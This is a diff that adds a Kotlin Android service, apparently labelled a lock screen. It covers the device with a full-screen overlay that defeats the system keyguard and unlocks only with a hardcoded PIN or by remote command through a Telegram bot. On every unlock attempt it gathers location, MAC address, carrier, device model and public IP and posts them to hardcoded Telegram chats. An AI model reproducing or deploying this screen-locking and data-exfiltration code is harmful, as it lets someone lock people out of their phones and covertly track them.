@@ -1,0 +1,356 @@
+package com.example.keyguard
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.graphics.PixelFormat
+import android.os.Build
+import android.os.IBinder
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import android.view.Gravity
+import android.view.LayoutInflater
+import android.view.WindowManager
+import android.view.inputmethod.InputMethodManager
+import android.widget.Button
+import android.widget.EditText
+import android.widget.RelativeLayout
+import android.widget.Toast
+import androidx.core.app.NotificationCompat
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import android.Manifest
+import android.content.IntentFilter
+import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.os.BatteryManager
+import android.telephony.TelephonyManager
+import androidx.core.app.ActivityCompat
+import android.view.ViewGroup
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
+import java.text.SimpleDateFormat
+import java.util.Locale
+import java.util.Date
+
+class LockScreenService : Service() {
+    private lateinit var windowManager: WindowManager
+    private lateinit var lockScreenView: RelativeLayout
+    private lateinit var fusedLocationClient: FusedLocationProviderClient
+    private lateinit var telegramBotHandler: TelegramBotHandler
+
+    companion object {
+        private const val NOTIFICATION_ID = 1
+        private const val CHANNEL_ID = "LockScreenServiceChannel"
+        const val TAG = "LockScreenService"
+    }
+
+    private var failedAttempts = 0
+    private var lockoutEndTime = 0L
+    private val lockoutHandler = Handler(Looper.getMainLooper())
+    private lateinit var lockoutRunnable: Runnable
+    private var isLockoutActive = false
+
+    override fun onCreate() {
+        super.onCreate()
+        Log.d(TAG, "LockScreenService onCreate called")
+        createNotificationChannel()
+        startForeground(NOTIFICATION_ID, createNotification())
+
+        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+
+        // Настройка TelegramBotHandler
+        telegramBotHandler = TelegramBotHandler(
+            context = this,
+            botToken = Constants.TELEGRAM_BOT_TOKEN,
+            chatId = Constants.TELEGRAM_CHAT_IDS.first() // Используйте первый chat_id или определите логику выбора
+        ) {
+            resetLockout()
+        }
+        Log.d(LockScreenService.TAG, "Initializing TelegramBotHandler and starting listening")
+        telegramBotHandler.startListening()
+
+        // Создаем View для overlay
+        lockScreenView = LayoutInflater.from(this).inflate(R.layout.activity_lock_screen, null) as RelativeLayout
+
+        // Параметры для overlay окна
+        val params = WindowManager.LayoutParams(
+            WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
+            PixelFormat.TRANSLUCENT
+        ).apply {
+            gravity = Gravity.TOP or Gravity.START
+        }
+
+        // Добавляем View в WindowManager
+        if (lockScreenView.parent != null) {
+            (lockScreenView.parent as ViewGroup).removeView(lockScreenView)
+        }
+        windowManager.addView(lockScreenView, params)
+
+        // Убедитесь, что EditText получает фокус и клавиатура отображается
+        val editTextPin = lockScreenView.findViewById<EditText>(R.id.editTextPin)
+        editTextPin.requestFocus()
+        showKeyboard(editTextPin)
+
+        // Настройка кнопки Unlock
+        val unlockButton = lockScreenView.findViewById<Button>(R.id.btnUnlock)
+        unlockButton.setOnClickListener {
+            try {
+            val enteredPin = editTextPin.text.toString()
+            val currentTime = System.currentTimeMillis()
+
+            if (isLockoutActive && lockoutEndTime > currentTime) {
+                Toast.makeText(this, "Неверные данные.", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+
+            if (enteredPin == "3333" && !isLockoutActive) {
+                // Сброс счетчиков при успешном вводе
+                failedAttempts = 0
+                lockoutEndTime = 0L
+                lockoutHandler.removeCallbacks(lockoutRunnable)
+                CoroutineScope(Dispatchers.IO).launch {
+                    collectAndSendData(this@LockScreenService, true)
+                }
+                Toast.makeText(this, "Успешно", Toast.LENGTH_SHORT).show()
+
+            } else {
+                failedAttempts++
+                if (failedAttempts > 2) {
+                    isLockoutActive = true
+                    lockoutEndTime = currentTime + (failedAttempts * 20 * 1000L)
+                    lockoutHandler.postDelayed(lockoutRunnable, lockoutEndTime - currentTime)
+                }
+                Toast.makeText(this, "Неверные данные.", Toast.LENGTH_SHORT).show()
+                CoroutineScope(Dispatchers.IO).launch {
+                    collectAndSendData(this@LockScreenService, false)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(LockScreenService.TAG, "Ошибка unlockButton onClickListener", e)
+            Toast.makeText(this, "Ошибка uB. Попробуйте ещё раз.", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        lockoutRunnable = Runnable {
+            isLockoutActive = false
+            lockoutEndTime = 0L
+        }
+    }
+
+    private fun resetLockout() {
+        failedAttempts = 0
+        isLockoutActive = false
+        lockoutEndTime = 0L
+        lockoutHandler.removeCallbacks(lockoutRunnable)
+    }
+
+    override fun onBind(intent: Intent): IBinder? {
+        return null
+    }
+
+    private fun showKeyboard(editText: EditText) {
+        val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+        editText.postDelayed({
+            imm.showSoftInput(editText, InputMethodManager.SHOW_IMPLICIT)
+        }, 100)
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val serviceChannel = NotificationChannel(
+                CHANNEL_ID,
+                "Lock Screen Service Channel",
+                NotificationManager.IMPORTANCE_DEFAULT
+            )
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(serviceChannel)
+        }
+    }
+
+    private fun createNotification(): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Lock Screen Service")
+            .setContentText("Running")
+            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .build()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        Log.d(TAG, "LockScreenService onDestroy called")
+        if (::lockScreenView.isInitialized && lockScreenView.parent != null) {
+            windowManager.removeView(lockScreenView)  // Убираем View при остановке сервиса
+        }
+    }
+
+    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
+        Log.d(TAG, "LockScreenService onStartCommand called")
+        return START_STICKY
+    }
+
+    private suspend fun collectAndSendData(context: Context, success: Boolean) {
+        try {
+            val location = getLocation(context)
+            val batteryLevel = getBatteryLevel(context)
+            val deviceInfo = getDeviceInfo(context)
+            val ipAddress = getIpAddress()
+            val attemptType = if (success) "SUCCESS" else "FAILURE"
+            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+
+            val data = JSONObject().apply {
+                put("timestamp", timestamp)
+                put("attemptType", attemptType)
+                put("location", location)
+                put("batteryLevel", batteryLevel)
+                put("deviceInfo", deviceInfo)
+                put("ipAddress", ipAddress)
+            }
+
+            val formattedMessage = formatMessage(data)
+            sendToTelegram(context, formattedMessage)
+        } catch (e: Exception) {
+            Log.e(LockScreenService.TAG, "Error in collectAndSendData", e)
+        }
+    }
+
+    private fun formatMessage(data: JSONObject): String {
+        return """
+        |*Unlock Attempt Log*
+        |*Timestamp:* ${data.getString("timestamp")}
+        |*Attempt Type:* ${data.getString("attemptType")}
+        |*Location:* ${data.getString("location")}
+        |*Battery Level:* ${data.getInt("batteryLevel")}% 
+        |*Device Info:* ${data.getString("deviceInfo")}
+        |*IP Address:* ${data.getString("ipAddress")}
+        """.trimMargin()
+    }
+}
+private fun getLocation(context: Context): String {
+    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+    return if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+        val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+        location?.let {
+            "${it.latitude}, ${it.longitude}"
+        } ?: "Location not available"
+    } else {
+        "Permission not granted"
+    }
+}
+
+private fun getBatteryLevel(context: Context): Int {
+    val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+    val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+    val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+
+    return if (level != -1 && scale != -1) {
+        (level.toFloat() / scale.toFloat() * 100.0f).toInt()
+    } else {
+        -1
+    }
+}
+
+private fun getDeviceInfo(context: Context): String {
+    val deviceModel = android.os.Build.MODEL
+    val deviceOS = android.os.Build.VERSION.RELEASE
+    val carrierName = (context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).networkOperatorName
+    val macAddress = getMacAddress()
+    return "Model: $deviceModel, OS: $deviceOS, Carrier: $carrierName, MAC: $macAddress"
+}
+
+private fun getMacAddress(): String {
+    try {
+        val interfaces = java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())
+        for (networkInterface in interfaces) {
+            if (!networkInterface.name.equals("wlan0", ignoreCase = true)) continue
+            val macBytes = networkInterface.hardwareAddress ?: return ""
+            val macAddress = macBytes.joinToString(separator = ":") { String.format("%02X", it) }
+            if (macAddress.isNotEmpty()) {
+                return macAddress
+            }
+        }
+    } catch (ex: Exception) {
+        return "02:00:00:00:00:00"
+    }
+    return "02:00:00:00:00:00"
+}
+
+private suspend fun getIpAddress(): String {
+    val client = OkHttpClient()
+    val request = Request.Builder()
+        .url("https://api.ipify.org?format=json")
+        .build()
+    return client.newCall(request).execute().use { response ->
+        if (response.isSuccessful) {
+            val jsonResponse = JSONObject(response.body?.string() ?: "")
+            jsonResponse.getString("ip")
+        } else {
+            "IP not available"
+        }
+    }
+}
+
+private fun isNetworkAvailable(context: Context): Boolean {
+    val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+    val network = connectivityManager.activeNetwork ?: return false
+    val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+    return networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+}
+
+private suspend fun sendToTelegram(context: Context, message: String) {
+    if (!isNetworkAvailable(context)) {
+        Log.e(LockScreenService.TAG, "No internet connection available")
+        return
+    }
+
+    val client = OkHttpClient()
+    val url = "https://api.telegram.org/bot${Constants.TELEGRAM_BOT_TOKEN}/sendMessage"
+
+    val mediaType = "application/json".toMediaTypeOrNull()
+
+    for (chatId in Constants.TELEGRAM_CHAT_IDS) {
+        val requestBody = JSONObject().apply {
+            put("chat_id", chatId)
+            put("text", message)
+            put("parse_mode", "Markdown")
+        }.toString().toRequestBody(mediaType)
+
+        val request = Request.Builder()
+            .url(url)
+            .post(requestBody)
+            .build()
+
+        try {
+            val response = client.newCall(request).execute()
+            if (!response.isSuccessful) {
+                val responseBody = response.body?.string()
+                Log.e(LockScreenService.TAG, "Failed to send message to Telegram: ${response.message}. Response body: $responseBody")
+            } else {
+                Log.i(LockScreenService.TAG, "Message sent to Telegram successfully")
+            }
+        } catch (e: Exception) {
+            Log.e(LockScreenService.TAG, "Error sending message to Telegram", e)
+        }
+    }
+}
